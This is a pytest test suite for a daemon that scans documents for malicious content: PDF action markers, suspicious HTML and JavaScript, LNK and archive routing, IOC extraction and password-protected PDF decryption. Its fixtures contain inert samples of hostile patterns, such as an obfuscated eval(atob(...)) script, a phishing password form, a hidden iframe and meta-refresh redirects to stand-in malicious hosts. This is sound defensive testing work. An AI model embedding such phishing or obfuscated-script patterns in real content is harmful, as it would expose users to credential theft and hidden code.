# SPDX-License-Identifier: EUPL-1.2
# SPDX-FileCopyrightText: 2026 Carsten Rosenberg <c.rosenberg@heinlein-support.de>
"""
test_xspct_scan.py — Comprehensive pytest test suite for InspectorDaemon / xspct_scan.daemon.

Coverage:
  Unit tests (no HTTP, direct method calls):
    - Session ID / session header helpers
    - API key verification (no keys, correct, wrong, multi-key, verify_fail flag)
    - Admin key verification (verify_admin_key)
    - IOC extraction (URLs, IPs, dedup, UTF-16, invalid IPs)
    - analyze_pdf  (clean, all markers, /URI IOC, password-protected)
    - analyze_html (clean, all suspicious JS keywords, forms, iframes, meta-refresh,
                   RemoteScriptInjection, inline-script → analyze_javascript wiring,
                   data-URI image wiring)
    - analyze_javascript (static patterns, source_label, clean JS, empty/None)
    - analyze_image (empty bytes, invalid bytes, real PNG structure)
    - analyze_yara (no-engine path returns None)
    - analyze_iocsearcher (no-engine / installed paths)
    - analyze_archive (non-archive, depth guard, empty zip, pdf member, size limit,
                      disabled-analyzer path)
    - extract_text_preview (HTML tag stripping, script removal, OOXML, char limit)
    - get_detected_type (MIME, filename extension, RTF magic bytes, image/archive/text)
    - merge_reports (dedup analyses, dedup IOCs, boolean OR, meta skip;
                    yara_matches dedup, iocs_extended deep-merge, archive_files,
                    exif first-wins, text_full longest-wins)
    - _make_base_report (all new fields present and correct types)
    - PartialReport (snapshot, merge completed, merge None result)
    - text_full absent by default / key always present
    - TextExtractorRtf (direct class test)
    - load_config (None, missing file, valid YAML, invalid YAML)
    - configure_logging (handler count after repeated calls)
    - _evict_tasks (OrderedDict eviction, oldest removed)
    - sync_analyze (PDF, HTML, unknown binary, real OLE file, real RTF file)

  Integration tests (full daemon in-process via aiohttp.test_utils):
    - GET /health /ping /
    - GET /metrics (Prometheus text, counter increments after scan)
    - POST /scan: missing doc → 400
    - POST /scan: clean PDF, malicious PDF, password-protected PDF, malicious HTML, OOXML, real OLE, real RTF
    - POST /scan: file_mime override, custom passwords field
    - POST /scan: same file twice returns same hash
    - POST /scan: very short timeout may return 202 (background processing)
    - POST /scan: application/octet-stream raw upload (200, hash equality, 415 for other types)
    - GET  /query: missing hash → 400, unknown hash → 404
    - POST /query: missing hash → 400, unknown hash → 404
    - GET  /query: after scan returns finished report with correct hash
    - POST /query: JSON body, after scan returns finished report
    - Auth: 401 on /scan /query /metrics when key required, no key sent
    - Auth: 200 when correct key sent; 401 when wrong key sent
    - Auth: /health always accessible without key
    - POST /admin/reload: 403 when no key configured, 403 on wrong key, 200 on correct key
    - GET /openapi.json: 200 with valid OpenAPI body when pydantic installed
    - GET /apidoc/redoc: 200 with ReDoc HTML when pydantic installed

Run:
    cd /home/cr/git/xspct_scan
    pip install -e .[dev]
    python3 -m pytest tests/ -v
"""

import asyncio
import base64
import hashlib
import io
import json
import logging
import os
import quopri
import struct
import zipfile
from unittest.mock import AsyncMock, MagicMock

import aiohttp
import pytest

from xspct_scan import client as xspct_client

try:
    import pymupdf as _pymupdf

    _HAS_PYMUPDF = True
except ImportError:
    _HAS_PYMUPDF = False

try:
    import fakeredis

    _HAS_FAKEREDIS = True
except ImportError:
    _HAS_FAKEREDIS = False

import xspct_scan.daemon as xspct
from tests.conftest import (
    ARCHIVE_MIXED_FILE,
    EML_FILE,
    HTML_PHISHING_FILE,
    OLE_FILE,
    PASSWD_FILE,
    PDF_EMBEDDED_FILE,
    PDF_JS_FILE,
    PDF_URI_FILE,
    QR_FILE,
    RTF_FILE,
)

# ---------------------------------------------------------------------------
# Synthetic byte-level fixtures
# ---------------------------------------------------------------------------
PDF_CLEAN = (
    b"%PDF-1.4\n"
    b"1 0 obj\n<< /Type /Catalog >>\nendobj\n"
    b"xref\n0 1\n0000000000 65535 f \n"
    b"trailer\n<< /Size 1 >>\n"
    b"startxref\n9\n%%EOF\n"
)

PDF_ALL_MARKERS = (
    b"%PDF-1.4\n"
    b"/JS /JavaScript /OpenAction /Launch /EmbeddedFiles /Encrypt /XFA\n"
    b"%%EOF\n"
)

PDF_WITH_URI = b"%PDF-1.4\n/URI (https://malware.example.com/stage2)\n%%EOF"

# Password used for the synthetically encrypted PDF fixture
_PDF_ENC_PASSWORD = "TestPwd42"


def _make_encrypted_pdf(user_pw: str) -> bytes:
    """Return a minimal AES-256-encrypted PDF protected by *user_pw*."""
    if not _HAS_PYMUPDF:
        return b""  # tests that need this are skipped via _HAS_PYMUPDF guard
    doc = _pymupdf.open()
    page = doc.new_page()
    page.insert_text((50, 50), "Encrypted test document")
    buf = doc.tobytes(
        encryption=_pymupdf.PDF_ENCRYPT_AES_256,
        owner_pw="owner",
        user_pw=user_pw,
    )
    doc.close()
    return buf


PDF_ENCRYPTED: bytes = _make_encrypted_pdf(_PDF_ENC_PASSWORD) if _HAS_PYMUPDF else b""

HTML_CLEAN = (
    b"<html><body><p>Hello world. Visit https://example.com for more.</p></body></html>"
)

HTML_MALICIOUS = (
    b"<html><head>"
    b'<meta http-equiv="refresh" content="0;url=http://evil.example.com">'
    b"</head><body>"
    b"<script>"
    b'eval(atob("YWxlcnQoMSk="));'
    b'document.write("<b>");'
    b'unescape("%3Cscript%3E");'
    b'atob("dGVzdA==");'
    b"String.fromCharCode(60);"
    b"</script>"
    b'<form action="http://phishing.example.com"><input type="password"></form>'
    b'<iframe src="http://hidden.example.com"></iframe>'
    b"</body></html>"
)

HTML_NO_TAGS = b"Just some plain text without any angle brackets at all."


def _make_ooxml() -> bytes:
    """Minimal valid OOXML (docx) zip with word/document.xml."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            "</Types>",
        )
        z.writestr(
            "word/document.xml",
            '<?xml version="1.0"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            "<w:body><w:p><w:r><w:t>Hello from OOXML test document</w:t></w:r></w:p></w:body>"
            "</w:document>",
        )
    return buf.getvalue()


OOXML_DATA = _make_ooxml()

# ---------------------------------------------------------------------------
# Global helpers
# ---------------------------------------------------------------------------


def _form(data: bytes, filename: str, **extra_fields) -> aiohttp.FormData:
    """Build a multipart form with a 'doc' part and optional extra fields."""
    form = aiohttp.FormData()
    form.add_field("doc", data, filename=filename)
    for name, value in extra_fields.items():
        form.add_field(name, value)
    return form


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def reset_global_state():
    """Reset module-level mutable state before and after every test."""
    saved_keys = list(xspct.config["xspct_api_key"])
    saved_fail = xspct.config["xspct_api_key_verify_fail"]
    saved_stats = dict(xspct.stats)
    saved_pw_file = xspct.config["xspct_password_file"]
    saved_stats_en = xspct.config["xspct_stats_enabled"]
    saved_ocr_preload = xspct.config["xspct_analyzers"]["image"][
        "ocr_preload_at_startup"
    ]

    xspct.config["xspct_api_key"] = []
    xspct.config["xspct_api_key_verify_fail"] = True
    xspct.config["xspct_password_file"] = PASSWD_FILE
    xspct.config["xspct_stats_enabled"] = False  # no background tasks in tests
    # Don't block every test's daemon.setup() on an EasyOCR model load/download;
    # tests that exercise OCR call analyze_image directly (lazy-init path).
    xspct.config["xspct_analyzers"]["image"]["ocr_preload_at_startup"] = False
    for k, v in xspct.stats.items():
        xspct.stats[k] = {} if isinstance(v, dict) else 0

    yield

    xspct.config["xspct_api_key"] = saved_keys
    xspct.config["xspct_api_key_verify_fail"] = saved_fail
    xspct.config["xspct_password_file"] = saved_pw_file
    xspct.config["xspct_stats_enabled"] = saved_stats_en
    xspct.config["xspct_analyzers"]["image"]["ocr_preload_at_startup"] = (
        saved_ocr_preload
    )
    for k, val in saved_stats.items():
        xspct.stats[k] = val


@pytest.fixture
async def client(aiohttp_client):
    """Full daemon TestClient with no API key required."""
    app = await xspct.make_app()
    return await aiohttp_client(app)


@pytest.fixture
async def auth_client(aiohttp_client):
    """Full daemon TestClient with API key enforcement."""
    xspct.config["xspct_api_key"] = ["test-secret-key"]
    xspct.config["xspct_api_key_verify_fail"] = True
    app = await xspct.make_app()
    return await aiohttp_client(app)


@pytest.fixture
def daemon():
    """Bare InspectorDaemon with a small, known password list."""
    d = xspct.InspectorDaemon()
    d.passwords = ["VelvetSweatshop", "test123", "123456", "password"]
    return d


# ===========================================================================
# UNIT TESTS
# ===========================================================================


class TestSessionHelpers:
    def test_session_id_is_6_hex_chars(self):
        sid = xspct.generate_session_id()
        assert len(sid) == 6
        assert all(c in "0123456789abcdef" for c in sid)

    def test_session_ids_are_unique(self):
        ids = {xspct.generate_session_id() for _ in range(200)}
        assert len(ids) > 1

    def test_make_session_format_no_rspamd(self):
        req = MagicMock()
        req.headers = {}
        s = xspct.make_session(req)
        assert s.startswith("<") and s.endswith(">")
        assert len(s) == 8  # <xxxxxx>

    def test_make_session_includes_rspamd_id(self):
        req = MagicMock()
        req.headers = {xspct.config["xspct_rspamd_header"]: "rspamd99"}
        s = xspct.make_session(req)
        assert "-" in s
        assert "rspamd" in s


class TestApiKeyVerification:
    def test_no_keys_always_passes(self):
        xspct.config["xspct_api_key"] = []
        req = MagicMock()
        req.headers = {}
        assert xspct.verify_api_key("<t>", req) is True

    def test_correct_key_passes(self):
        xspct.config["xspct_api_key"] = ["my-secret"]
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "my-secret"}
        assert xspct.verify_api_key("<t>", req) is True

    def test_wrong_key_fails_when_verify_fail_true(self):
        xspct.config["xspct_api_key"] = ["my-secret"]
        xspct.config["xspct_api_key_verify_fail"] = True
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "wrong"}
        assert xspct.verify_api_key("<t>", req) is False

    def test_wrong_key_passes_when_verify_fail_false(self):
        xspct.config["xspct_api_key"] = ["my-secret"]
        xspct.config["xspct_api_key_verify_fail"] = False
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "wrong"}
        assert xspct.verify_api_key("<t>", req) is True

    def test_missing_header_fails(self):
        xspct.config["xspct_api_key"] = ["my-secret"]
        xspct.config["xspct_api_key_verify_fail"] = True
        req = MagicMock()
        req.headers = {}
        assert xspct.verify_api_key("<t>", req) is False

    def test_multi_key_first_accepted(self):
        xspct.config["xspct_api_key"] = ["key-A", "key-B"]
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "key-A"}
        assert xspct.verify_api_key("<t>", req) is True

    def test_multi_key_second_accepted(self):
        xspct.config["xspct_api_key"] = ["key-A", "key-B"]
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "key-B"}
        assert xspct.verify_api_key("<t>", req) is True

    def test_multi_key_unknown_rejected(self):
        xspct.config["xspct_api_key"] = ["key-A", "key-B"]
        xspct.config["xspct_api_key_verify_fail"] = True
        req = MagicMock()
        req.headers = {xspct.config["xspct_api_header"]: "key-C"}
        assert xspct.verify_api_key("<t>", req) is False


class TestExtractIocs:
    def test_empty_bytes(self, daemon):
        r = daemon.extract_iocs(b"")
        assert r == {"urls": [], "ips": [], "domains": []}

    def test_url_detected(self, daemon):
        r = daemon.extract_iocs(b"payload at https://evil.example.com/drop?x=1")
        assert any("evil.example.com" in u for u in r["urls"])

    def test_ip_detected(self, daemon):
        r = daemon.extract_iocs(b"C2 at 10.20.30.40")
        assert "10.20.30.40" in r["ips"]

    def test_invalid_octet_rejected(self, daemon):
        r = daemon.extract_iocs(b"bogus 999.999.999.999")
        assert "999.999.999.999" not in r["ips"]

    def test_url_deduplication(self, daemon):
        r = daemon.extract_iocs(b"https://evil.com https://evil.com https://evil.com")
        assert r["urls"].count("https://evil.com") == 1

    def test_utf16le_url_detected(self, daemon):
        payload = "https://hidden.example.com".encode("utf-16le")
        r = daemon.extract_iocs(payload)
        assert any("hidden.example.com" in u for u in r["urls"])

    def test_multiple_ips(self, daemon):
        r = daemon.extract_iocs(b"hosts: 1.2.3.4 and 5.6.7.8")
        assert "1.2.3.4" in r["ips"]
        assert "5.6.7.8" in r["ips"]

    def test_domain_with_valid_tld_kept(self, daemon):
        r = daemon.extract_iocs(b"see evil.example.com for details")
        assert "evil.example.com" in r["domains"]

    def test_domain_with_file_ext_tld_filtered(self, daemon):
        # Windows file names like MSO.DLL or Normal.dotm must not appear as domains
        r = daemon.extract_iocs(b"MSO.DLL VBE7.DLL Normal.dotm stdole2.tlb")
        assert not any(
            d.lower().endswith((".dll", ".dotm", ".tlb")) for d in r["domains"]
        )

    def test_vba_internal_names_filtered(self, daemon):
        # VBA object paths extracted from OLE streams must not appear as domains
        r = daemon.extract_iocs(b"BzqPKManager.sqW PROJECT.NLHWEHWJ.AVVKQDABDFCIT")
        assert "BzqPKManager.sqW" not in r["domains"]
        assert "PROJECT.NLHWEHWJ.AVVKQDABDFCIT" not in r["domains"]

    def test_pdf_internal_refs_filtered(self, daemon):
        # Short PDF internal object references must not appear as domains,
        # including fragments with valid ccTLDs but 1-2-char SLDs (Jy.gY, o.MA)
        r = daemon.extract_iocs(b"JNWs.oO g.xJ i.yZ xf.jx y.MDO Jy.gY o.MA")
        assert not r["domains"]

    def test_short_sld_with_valid_cctld_filtered(self, daemon):
        # 1–2-char SLDs before real ccTLDs are binary-internal artefacts, not IOCs
        r = daemon.extract_iocs(b"Jy.gY o.MA xf.jx")
        assert not r["domains"]

    def test_min_sld_length_keeps_real_domains(self, daemon):
        # bit.ly (3-char SLD) and longer SLDs must not be filtered
        r = daemon.extract_iocs(b"see bit.ly and krittv.ru for context")
        assert "bit.ly" in r["domains"]
        assert "krittv.ru" in r["domains"]


# ===========================================================================
# UNIT TESTS — _ioc_excluded helper
# ===========================================================================


class TestIocExcluded:
    def test_exact_match(self):
        assert xspct.InspectorDaemon._ioc_excluded("w3.org", ("w3.org",))

    def test_subdomain_match(self):
        assert xspct.InspectorDaemon._ioc_excluded("www.w3.org", ("w3.org",))

    def test_deep_subdomain_match(self):
        assert xspct.InspectorDaemon._ioc_excluded("a.b.w3.org", ("w3.org",))

    def test_no_match(self):
        assert not xspct.InspectorDaemon._ioc_excluded("evil.com", ("w3.org",))

    def test_partial_suffix_not_matched(self):
        # 'w3.org' should NOT match 'notw3.org'
        assert not xspct.InspectorDaemon._ioc_excluded("notw3.org", ("w3.org",))

    def test_empty_suffixes(self):
        assert not xspct.InspectorDaemon._ioc_excluded("anything.com", ())


# ===========================================================================
# UNIT TESTS — extract_iocs domain exclusion
# ===========================================================================


class TestExtractIocsExcludeDomains:
    def test_excluded_url_dropped(self, daemon):
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = ["w3.org"]
        try:
            r = daemon.extract_iocs(b"see http://www.w3.org/1999/xhtml for details")
            assert all("w3.org" not in u for u in r["urls"])
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved

    def test_excluded_domain_dropped(self, daemon):
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = ["w3.org"]
        try:
            r = daemon.extract_iocs(b"namespace http://www.w3.org/TR/xhtml1/")
            assert all("w3.org" not in d for d in r["domains"])
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved

    def test_non_excluded_url_kept(self, daemon):
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = ["w3.org"]
        try:
            r = daemon.extract_iocs(b"payload at https://evil.example.com/drop")
            assert any("evil.example.com" in u for u in r["urls"])
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved

    def test_empty_exclusion_list_keeps_all(self, daemon):
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = []
        try:
            r = daemon.extract_iocs(
                b"see http://www.w3.org/TR/xhtml1/ and https://evil.com"
            )
            assert any("w3.org" in u for u in r["urls"])
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved


# ===========================================================================
# UNIT TESTS — analyze_iocsearcher domain exclusion
# ===========================================================================


class TestAnalyzeIocsearcherExclude:
    def test_excluded_fqdn_dropped(self, daemon):
        if not xspct.HAS_IOCSEARCHER:
            pytest.skip("iocsearcher not installed")
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = ["w3.org"]
        try:
            result = daemon.analyze_iocsearcher(
                "namespace http://www.w3.org/1999/xhtml something", "test"
            )
            if result and "iocs_extended" in result:
                for ioc_list in result["iocs_extended"].values():
                    assert all("w3.org" not in v for v in ioc_list)
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved

    def test_non_excluded_kept(self, daemon):
        if not xspct.HAS_IOCSEARCHER:
            pytest.skip("iocsearcher not installed")
        saved = xspct.config.get("xspct_ioc_url_exclude_domains")
        xspct.config["xspct_ioc_url_exclude_domains"] = ["w3.org"]
        try:
            result = daemon.analyze_iocsearcher(
                "contact info@evil.example.com for payload", "test"
            )
            # evil.example.com is NOT excluded — email or fqdn should survive
            if result and "iocs_extended" in result:
                all_vals = [v for lst in result["iocs_extended"].values() for v in lst]
                assert any("evil.example.com" in v for v in all_vals)
        finally:
            xspct.config["xspct_ioc_url_exclude_domains"] = saved


class TestAnalyzePdf:
    def test_non_pdf_returns_none(self, daemon):
        assert daemon.analyze_pdf(b"not a pdf at all") is None

    def test_clean_pdf_no_flags(self, daemon):
        r = daemon.analyze_pdf(PDF_CLEAN)
        assert r is not None
        assert r["has_javascript"] is False
        assert r["has_openaction"] is False
        assert r["has_embedded_files"] is False
        assert r["has_launch"] is False
        assert r["is_encrypted"] is False
        assert r["analyses"] == []

    def test_all_markers_detected(self, daemon):
        r = daemon.analyze_pdf(PDF_ALL_MARKERS)
        assert r is not None
        types = {a["type"] for a in r["analyses"]}
        assert "JavaScript" in types
        assert "AutoExecute" in types
        assert "EmbeddedFile" in types
        assert "Execution" in types
        assert "Encryption" in types
        assert "XFA" in types

    def test_all_boolean_flags_set(self, daemon):
        r = daemon.analyze_pdf(PDF_ALL_MARKERS)
        assert r["has_javascript"] is True
        assert r["has_openaction"] is True
        assert r["has_embedded_files"] is True
        assert r["has_launch"] is True
        assert r["is_encrypted"] is True

    def test_uri_ioc_extracted(self, daemon):
        r = daemon.analyze_pdf(PDF_WITH_URI)
        assert any("malware.example.com" in u for u in r["iocs"]["urls"])

    def test_text_preview_is_list(self, daemon):
        r = daemon.sync_analyze("s", "clean.pdf", PDF_CLEAN, "application/pdf")
        assert isinstance(r["text_preview"], list)


@pytest.mark.skipif(not _HAS_PYMUPDF, reason="PyMuPDF not installed")
class TestAnalyzePdfEncrypted:
    """Tests for password-protected PDF decryption via analyze_pdf / sync_analyze."""

    def test_encrypted_pdf_is_flagged(self, daemon):
        """An encrypted PDF with the wrong password list is flagged as encrypted."""
        daemon.passwords = ["wrong1", "wrong2"]
        r = daemon.analyze_pdf(PDF_ENCRYPTED)
        assert r is not None
        assert r["is_encrypted"] is True
        assert r["decrypted"] is False

    def test_encrypted_pdf_no_hit_when_no_password(self, daemon):
        """No analysis hits are produced when the PDF cannot be decrypted."""
        daemon.passwords = ["wrong1", "wrong2"]
        r = daemon.analyze_pdf(PDF_ENCRYPTED)
        # Only Encryption indicators (from PyMuPDF and optionally pdfid) should
        # be present; no JS / launch / other hits.
        types = {a["type"] for a in r["analyses"]}
        assert types <= {"Encryption", "pdfid-Encryption"}

    def test_correct_daemon_password_decrypts(self, daemon):
        """Correct password in daemon.passwords unlocks the PDF."""
        daemon.passwords = ["wrong1", _PDF_ENC_PASSWORD, "wrong2"]
        r = daemon.analyze_pdf(PDF_ENCRYPTED)
        assert r["decrypted"] is True
        assert r["decryption_password"] == _PDF_ENC_PASSWORD

    def test_correct_custom_password_decrypts(self, daemon):
        """Correct password supplied as custom_passwords is tried first."""
        daemon.passwords = ["wrong1", "wrong2"]
        r = daemon.analyze_pdf(PDF_ENCRYPTED, custom_passwords=[_PDF_ENC_PASSWORD])
        assert r["decrypted"] is True
        assert r["decryption_password"] == _PDF_ENC_PASSWORD

    def test_custom_password_tried_before_daemon_list(self, daemon):
        """custom_passwords are exhausted before falling back to daemon.passwords."""
        # Put the correct password only in daemon.passwords so if custom_passwords
        # are tried first (and wrong), decryption still succeeds via fallback.
        daemon.passwords = [_PDF_ENC_PASSWORD]
        r = daemon.analyze_pdf(PDF_ENCRYPTED, custom_passwords=["bad1", "bad2"])
        assert r["decrypted"] is True

    def test_decrypted_pdf_has_report_keys(self, daemon):
        """After successful decryption the standard report keys are present."""
        daemon.passwords = [_PDF_ENC_PASSWORD]
        r = daemon.analyze_pdf(PDF_ENCRYPTED)
        for key in (
            "has_javascript",
            "has_openaction",
            "iocs",
            "decrypted",
            "analyses",
        ):
            assert key in r

    def test_sync_analyze_decrypts_encrypted_pdf(self, daemon):
        """sync_analyze propagates decryption state for a PDF."""
        daemon.passwords = [_PDF_ENC_PASSWORD]
        r = daemon.sync_analyze("<t>", "enc.pdf", PDF_ENCRYPTED, "application/pdf")
        assert r["detected_type"] == "pdf"
        assert r["decrypted"] is True
        assert r["decryption_password"] == _PDF_ENC_PASSWORD

    def test_sync_analyze_custom_password_decrypts_pdf(self, daemon):
        """custom_passwords passed to sync_analyze reach analyze_pdf."""
        daemon.passwords = ["wrong"]
        r = daemon.sync_analyze(
            "<t>",
            "enc.pdf",
            PDF_ENCRYPTED,
            "application/pdf",
            custom_passwords=[_PDF_ENC_PASSWORD],
        )
        assert r["decrypted"] is True


class TestAnalyzeHtml:
    def test_no_angle_brackets_returns_none(self, daemon):
        assert daemon.analyze_html(HTML_NO_TAGS) is None

    def test_clean_html_no_flags(self, daemon):
        r = daemon.analyze_html(HTML_CLEAN)
        assert r is not None
        assert r["has_scripts"] is False
        assert r["has_forms"] is False
        assert r["has_iframes"] is False
        assert r["has_meta_refresh"] is False

    def test_malicious_html_all_flags(self, daemon):
        r = daemon.analyze_html(HTML_MALICIOUS)
        assert r["has_scripts"] is True
        assert r["has_forms"] is True
        assert r["has_iframes"] is True
        assert r["has_meta_refresh"] is True

    def test_suspicious_js_keywords_found(self, daemon):
        r = daemon.analyze_html(HTML_MALICIOUS)
        kw = {a["keyword"] for a in r["analyses"] if a["type"] == "SuspiciousJS"}
        assert "eval(" in kw
        assert "document.write(" in kw
        assert "unescape(" in kw
        assert "atob(" in kw
        assert "String.fromCharCode(" in kw

    def test_url_in_clean_html_extracted(self, daemon):
        r = daemon.analyze_html(HTML_CLEAN)
        assert any("example.com" in u for u in r["iocs"]["urls"])

    def test_meta_refresh_detection(self, daemon):
        data = b'<html><head><meta http-equiv="refresh" content="0;url=http://x.com"></head></html>'
        r = daemon.analyze_html(data)
        assert r["has_meta_refresh"] is True

    def test_base64_blob_detection(self, daemon):
        blob = b"A" * 1200
        data = b"<html><body>" + blob + b"</body></html>"
        r = daemon.analyze_html(data)
        types = {a["type"] for a in r["analyses"]}
        assert "HTMLSmuggling" in types


class TestExtractTextPreview:
    def test_html_strips_tags(self, daemon):
        data = b"<html><body><p>Hello <b>World</b></p></body></html>"
        p = daemon.extract_text_preview(data, "text/html")
        assert "Hello" in p
        assert "<b>" not in p

    def test_html_removes_script_content(self, daemon):
        data = (
            b'<html><body><script>eval("dangerous")</script><p>Safe</p></body></html>'
        )
        p = daemon.extract_text_preview(data, "text/html")
        assert "eval" not in p
        assert "Safe" in p

    def test_ooxml_extracts_text(self, daemon):
        p = daemon.extract_text_preview(
            OOXML_DATA,
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        )
        assert "Hello from OOXML" in p

    def test_limit_is_respected(self, daemon):
        data = b"<p>" + b"X" * 5000 + b"</p>"
        p = daemon.extract_text_preview(data, "text/html", limit=100)
        assert len(p) <= 100

    def test_binary_data_printable_only(self, daemon):
        data = bytes(range(256))
        p = daemon.extract_text_preview(data, "application/octet-stream")
        assert isinstance(p, str)


class TestGetDetectedType:
    def test_pdf_by_mime(self, daemon):
        assert daemon.get_detected_type("application/pdf", "", "", b"") == "pdf"

    def test_pdf_by_desc(self, daemon):
        assert daemon.get_detected_type("", "PDF document", "", b"") == "pdf"

    def test_pdf_by_extension(self, daemon):
        assert daemon.get_detected_type("", "", "report.pdf", b"") == "pdf"

    def test_html_by_mime(self, daemon):
        assert daemon.get_detected_type("text/html", "", "", b"") == "html"

    def test_html_by_extension_html(self, daemon):
        assert daemon.get_detected_type("", "", "page.html", b"") == "html"

    def test_html_by_extension_htm(self, daemon):
        assert daemon.get_detected_type("", "", "page.htm", b"") == "html"

    def test_html_by_extension_xhtml(self, daemon):
        assert daemon.get_detected_type("", "", "page.xhtml", b"") == "html"

    def test_html_by_xhtml_mime(self, daemon):
        assert daemon.get_detected_type("application/xhtml+xml", "", "", b"") == "html"

    def test_rtf_by_magic_bytes(self, daemon):
        assert daemon.get_detected_type("", "", "", b"{\\rtf1") == "office"

    def test_office_default(self, daemon):
        assert (
            daemon.get_detected_type(
                "application/octet-stream", "binary", "file.bin", b""
            )
            == "unknown"
        )

    @pytest.mark.parametrize(
        "ext",
        [".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".ps1", ".bat", ".cmd"],
    )
    def test_script_extensions_route_to_script(self, daemon, ext):
        assert daemon.get_detected_type("", "", f"sample{ext}", b"") == "script"

    def test_hta_routes_to_html_not_script(self, daemon):
        assert daemon.get_detected_type("", "", "dropper.hta", b"") == "html"

    def test_lnk_by_extension(self, daemon):
        assert daemon.get_detected_type("", "", "shortcut.lnk", b"") == "lnk"

    def test_lnk_by_mime(self, daemon):
        assert (
            daemon.get_detected_type("application/x-ms-shortcut", "", "", b"") == "lnk"
        )

    def test_lnk_by_magic_desc(self, daemon):
        assert daemon.get_detected_type("", "MS Windows shortcut", "", b"") == "lnk"

    def test_lnk_by_magic_bytes(self, daemon):
        header = (
            b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00"
            b"\xc0\x00\x00\x00\x00\x00\x00\x46"
        )
        assert daemon.get_detected_type("", "", "", header) == "lnk"

    def test_lnk_ambiguous_mime_with_extension_routes_to_lnk(self, daemon):
        """application/x-ms-application is Rspamd's lua_magic content-type
        for .lnk, but it's also used for PE executables — confirmed by the
        .lnk extension, it must still route to "lnk"."""
        assert (
            daemon.get_detected_type(
                "application/x-ms-application", "", "shortcut.lnk", b""
            )
            == "lnk"
        )

    def test_lnk_ambiguous_mime_with_magic_bytes_routes_to_lnk(self, daemon):
        header = (
            b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00"
            b"\xc0\x00\x00\x00\x00\x00\x00\x46"
        )
        assert (
            daemon.get_detected_type("application/x-ms-application", "", "", header)
            == "lnk"
        )

    def test_lnk_ambiguous_mime_alone_does_not_route_to_lnk(self, daemon):
        """Without a confirming extension or magic-byte signature, the
        ambiguous MIME alone (e.g. an actual PE executable reported with
        the same content-type by some detectors) must not be misrouted."""
        assert (
            daemon.get_detected_type("application/x-ms-application", "", "app.exe", b"")
            != "lnk"
        )

    @pytest.mark.parametrize(
        "mime",
        ["application/x-bzip", "application/x-iso", "application/x-compress"],
    )
    def test_rspamd_lua_magic_archive_mime_variants_recognized(self, daemon, mime):
        """Rspamd's lua_magic reports these content-types (types.lua) for
        bzip2/ISO9660/Unix-compress content; xspct's own libmagic-derived
        variants ("x-bzip2", "x-iso9660-image") were already recognized but
        these weren't."""
        assert daemon.get_detected_type(mime, "", "", b"") == "archive"

    def test_unix_compress_extension_routes_to_archive(self, daemon):
        assert daemon.get_detected_type("", "", "archive.Z", b"") == "archive"


class TestMergeReports:
    def _base_target(self):
        return {
            "analyses": [],
            "iocs": {"urls": [], "ips": [], "domains": []},
            "rtf_objects": [],
        }

    def test_analyses_deduplication(self, daemon):
        item = {"type": "AutoExec", "keyword": "kw", "description": "desc"}
        t = self._base_target()
        t["analyses"].append(item)
        daemon.merge_reports(t, {"analyses": [item]})
        assert len(t["analyses"]) == 1

    def test_analyses_new_item_added(self, daemon):
        t = self._base_target()
        daemon.merge_reports(
            t, {"analyses": [{"type": "A", "keyword": "x", "description": "d"}]}
        )
        assert len(t["analyses"]) == 1

    def test_iocs_deduplication(self, daemon):
        t = self._base_target()
        t["iocs"]["urls"] = ["http://a.com"]
        daemon.merge_reports(
            t,
            {
                "iocs": {
                    "urls": ["http://a.com", "http://b.com"],
                    "ips": [],
                    "domains": [],
                }
            },
        )
        assert t["iocs"]["urls"].count("http://a.com") == 1
        assert "http://b.com" in t["iocs"]["urls"]

    def test_boolean_fields_ored(self, daemon):
        t = self._base_target()
        t["has_macro"] = False
        daemon.merge_reports(t, {"has_macro": True})
        assert t["has_macro"] is True

    def test_boolean_false_does_not_override_true(self, daemon):
        t = self._base_target()
        t["has_macro"] = True
        daemon.merge_reports(t, {"has_macro": False})
        assert t["has_macro"] is True

    def test_meta_key_is_skipped(self, daemon):
        t = self._base_target()
        t["meta"] = {"version": "original"}
        daemon.merge_reports(t, {"meta": {"version": "overwrite"}})
        assert t["meta"]["version"] == "original"

    def test_none_source_is_noop(self, daemon):
        t = self._base_target()
        daemon.merge_reports(t, None)
        assert t["analyses"] == []


class TestEvictTasks:
    def test_evicts_oldest_entries(self, daemon):
        daemon._TASKS_MAX_SIZE = 3
        for i in range(5):
            daemon.tasks[f"h{i}"] = f"result{i}"
            daemon.tasks.move_to_end(f"h{i}")
            daemon._evict_tasks()
        assert len(daemon.tasks) == 3
        assert "h0" not in daemon.tasks
        assert "h1" not in daemon.tasks
        assert "h4" in daemon.tasks

    def test_does_not_evict_under_limit(self, daemon):
        daemon._TASKS_MAX_SIZE = 10
        for i in range(5):
            daemon.tasks[f"h{i}"] = i
        daemon._evict_tasks()
        assert len(daemon.tasks) == 5


class TestSyncAnalyze:
